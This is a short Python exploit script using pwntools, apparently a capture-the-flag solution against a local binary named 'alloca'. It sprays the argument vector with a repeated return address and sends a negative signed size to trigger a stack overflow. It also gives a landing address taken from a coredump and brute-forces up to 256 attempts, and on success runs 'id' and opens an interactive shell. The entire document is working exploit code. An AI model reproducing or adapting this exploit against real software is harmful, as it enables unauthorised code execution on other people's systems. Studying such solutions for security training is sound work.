from pwn import *
LANDING_ADDR = u32(p32(0xffe77e3f),signed=True)  # extracted from a coredump
for i in range(256):
    # I used a sleep hook for the local exploit
    p = process(executable="./alloca", argv=[p32(0x80485ab)*32000], env = {"LD_PRELOAD":"./libnosleep.so"})
    p.sendline(str(-67).encode())              # size is signed
    p.sendline(str(LANDING_ADDR).encode())     
    #sleep(3.5)
    p.recvuntil(b"software\n")
    try:
        p.sendline(b"id")
        print(p.recvline())
        pause()
        p.interactive()
    except EOFError:
        print("Try... {}".format(i))
    p.close()
